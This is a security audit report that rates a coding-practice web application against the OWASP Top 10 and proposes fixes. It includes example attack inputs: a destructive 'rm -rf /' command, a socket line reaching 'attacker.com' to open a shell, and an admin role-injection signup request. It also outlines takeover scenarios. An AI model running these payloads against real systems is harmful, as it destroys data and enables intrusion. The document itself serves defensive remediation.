# OWASP Top 10 Security Scan Report
**Generated:** 2026-02-05  
**Application:** Codebasics Practice Room  
**Standard:** OWASP Top 10 (2021)

---

## Executive Summary

| Category | Risk Level | Status |
|----------|------------|--------|
| A01: Broken Access Control | 🔴 CRITICAL | VULNERABLE |
| A02: Cryptographic Failures | 🟢 LOW | ACCEPTABLE |
| A03: Injection | 🔴 CRITICAL | VULNERABLE |
| A04: Insecure Design | 🟠 HIGH | VULNERABLE |
| A05: Security Misconfiguration | 🟡 MEDIUM | NEEDS REVIEW |
| A06: Vulnerable Components | 🟡 MEDIUM | NEEDS AUDIT |
| A07: Auth Failures | 🔴 CRITICAL | VULNERABLE |
| A08: Integrity Failures | 🟢 LOW | ACCEPTABLE |
| A09: Logging Failures | 🟠 HIGH | INADEQUATE |
| A10: SSRF | 🟢 LOW | NOT APPLICABLE |

---

## A01: Broken Access Control
**Risk Level:** 🔴 CRITICAL

### Finding 1: Privilege Escalation via Role Assignment
**Location:** `POST /api/v1/auth/signup`

**Attack:**
```http
POST /api/v1/auth/signup
{"username":"hacker", "email":"h@x.com", "password":"x", "role":"admin"}
```

**Impact:** Full admin access to unauthenticated attackers.

**Solution:**
```python
# Force role to "learner" in create_user()
role="learner"  # Never trust client input
```

---

### Finding 2: Broken Password Reset
**Location:** `POST /api/v1/auth/reset-password`

**Attack:** Reset any account password without authentication or email verification.

**Solution:** Implement token-based email verification flow.

---

## A02: Cryptographic Failures
**Risk Level:** 🟢 LOW

**Analysis:**
- ✅ Passwords hashed with `pbkdf2_sha256` (secure)
- ✅ JWT tokens signed with HS256
- ⚠️ `settings.SECRET_KEY` should be validated as cryptographically random

---

## A03: Injection
**Risk Level:** 🔴 CRITICAL

### Finding: Remote Code Execution (RCE)
**Location:** `execution_service.py:92`

```python
exec(user_source, global_ns)  # ARBITRARY CODE EXECUTION
```

**Attack:**
```python
# User submits as "solution":
import os; os.system('rm -rf / --no-preserve-root')
# OR
import socket; s=socket.socket(); s.connect(('attacker.com',4444)); ...
```

**Impact:**
- Full server compromise
- Data exfiltration
- Lateral movement
- Cryptomining
- Ransomware

**Current Mitigations:** NONE (runs as host Python, no sandboxing)

**Solution Options (Priority Order):**
1. **Docker containerization** with:
   - `--network=none` (no network)
   - `--read-only` filesystem
   - Resource limits (`--memory=128m --cpus=0.5`)
   - Non-root user
   - Timeout (already implemented: 60s)

2. **RestrictedPython** library (partial)
3. **Pyodide/WebAssembly** sandbox
4. **AWS Lambda / Google Cloud Functions** isolated execution

---

## A04: Insecure Design
**Risk Level:** 🟠 HIGH

### Finding 1: Password Reset Without Email Verification
**Issue:** Knowing username + email = account takeover

### Finding 2: No Rate Limiting
**Locations:**
- `/login` - Brute force possible
- `/signup` - Account spam
- `/reset-password` - Abuse possible
- `/execute/run` - DoS via compute

**Solution:** Implement rate limiting:
```python
from slowapi import Limiter
limiter = Limiter(key_func=get_remote_address)

@router.post("/login")
@limiter.limit("5/minute")
async def login(...):
```

---

## A05: Security Misconfiguration
**Risk Level:** 🟡 MEDIUM

### Finding 1: Default Credentials
**Location:** `database.py:57-87`

```python
# Hardcoded defaults
DEFAULT_ADMIN_USERNAME = "admin"
DEFAULT_ADMIN_PASSWORD = "admin"  # ASSUMED
```

### Finding 2: Debug Output Enabled
**Location:** `questions.py:15, execute.py:69`

```python
print(f"DEBUG: ...")  # Leaks internal state
```

**Solution:** Use proper logging with configurable levels.

---

## A06: Vulnerable & Outdated Components
**Risk Level:** 🟡 MEDIUM

**Recommendation:** Run dependency audit:
```bash
pip-audit
# OR
safety check
```

**Known High-Risk Libraries:**
- `jose` - Check for CVEs
- `pandas` - Check version
- `passlib` - Check version

---

## A07: Identification & Authentication Failures
**Risk Level:** 🔴 CRITICAL

### Finding 1: No Account Lockout
**Issue:** Unlimited login attempts possible.

### Finding 2: User Enumeration
**Location:** `/signup` returns "username already exists"

### Finding 3: Weak Session Management
**Issue:** JWT expiry of `ACCESS_TOKEN_EXPIRE_MINUTES` should be verified as reasonable (e.g., 15-60 min).

---

## A08: Software & Data Integrity Failures
**Risk Level:** 🟢 LOW

**Analysis:**
- No CI/CD pipeline visible (can't assess)
- No auto-updates of dependencies visible
- JWT signature verification is implemented correctly

---

## A09: Security Logging & Monitoring Failures
**Risk Level:** 🟠 HIGH

### Finding: No Security Audit Logging

**Missing Logs:**
- Failed login attempts (brute force detection)
- Password changes
- Role changes
- Admin actions (question create/delete)
- Code execution requests (for abuse detection)

**Solution:**
```python
import logging
security_logger = logging.getLogger("security")

# In login handler:
if not user:
    security_logger.warning(f"Failed login for {username} from {ip}")
```

---

## A10: Server-Side Request Forgery (SSRF)
**Risk Level:** 🟢 LOW

**Analysis:** No user-controlled URL fetching identified. N/A.

---

## Attack Scenarios Summary

### Scenario 1: Full System Takeover (5 minutes)
1. Register as admin via `/signup` with `role: "admin"`
2. Login via `/admin/login`
3. Upload malicious `validator.py` with reverse shell
4. Trigger code execution
5. **Result:** Full server access

### Scenario 2: Account Takeover (2 minutes)
1. Identify target username
2. Guess or find email (LinkedIn, etc.)
3. Call `/reset-password` with new password
4. Login as victim
5. **Result:** Access to victim's account and data

### Scenario 3: DoS via Compute Abuse
1. Register account
2. Submit infinite loop code:
   ```python
   while True: pass
   ```
3. Timeout is 60s but no rate limit
4. Submit 100 parallel requests
5. **Result:** Server CPU exhaustion

---

## Remediation Roadmap

| Phase | Items | Timeline |
|-------|-------|----------|
| **Emergency (Today)** | Fix role assignment, add code sandboxing | 4 hours |
| **Week 1** | Password reset flow, rate limiting | 2 days |
| **Week 2** | Logging, monitoring, dependency audit | 3 days |
| **Ongoing** | Security testing, penetration tests | Continuous |
